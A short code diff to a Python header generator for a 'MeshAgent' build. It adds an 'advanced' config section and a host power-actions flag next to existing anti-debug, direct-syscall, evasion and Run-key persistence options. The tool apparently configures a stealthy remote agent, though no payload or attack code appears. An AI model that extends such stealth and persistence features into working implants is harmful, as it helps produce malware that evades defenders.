@@ -123,6 +123,7 @@ def build_header(config: dict) -> str:
     stealth = get_value(config, "stealth", {}) or {}
     evasion = get_value(config, "evasion", {}) or {}
     artifacts = get_value(config, "artifacts", {}) or {}
+    advanced = get_value(config, "advanced", {}) or {}
 
     install_root = get_value(branding, "installRoot", "C:/ProgramData/MeshAgent")
     log_path = str(get_value(branding, "logPath", f"{install_root}/logs")).rstrip("/")
@@ -333,6 +334,9 @@ def build_header(config: dict) -> str:
         f"#define MESH_AGENT_ANTI_DEBUG {bool_to_int(get_bool(stealth, 'antiDebug'))}",
         f"#define MESH_AGENT_SYSCALLS_DIRECT {bool_to_int(get_bool(stealth, 'syscallsDirectMode'))}",
         f"#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT {bool_to_int(bundle_extract)}",
+        "",
+        "/* ========== Local Operations Policy ========== */",
+        f"#define MESH_AGENT_ALLOW_HOST_POWER_ACTIONS {bool_to_int(get_bool(advanced, 'allowHostPowerActions'))}",
         "",
         "/* ========== Persistence Configuration ========== */",
         f"#define MESH_AGENT_PERSIST_RUNKEY {bool_to_int(get_bool(persistence, 'runKey'))}",
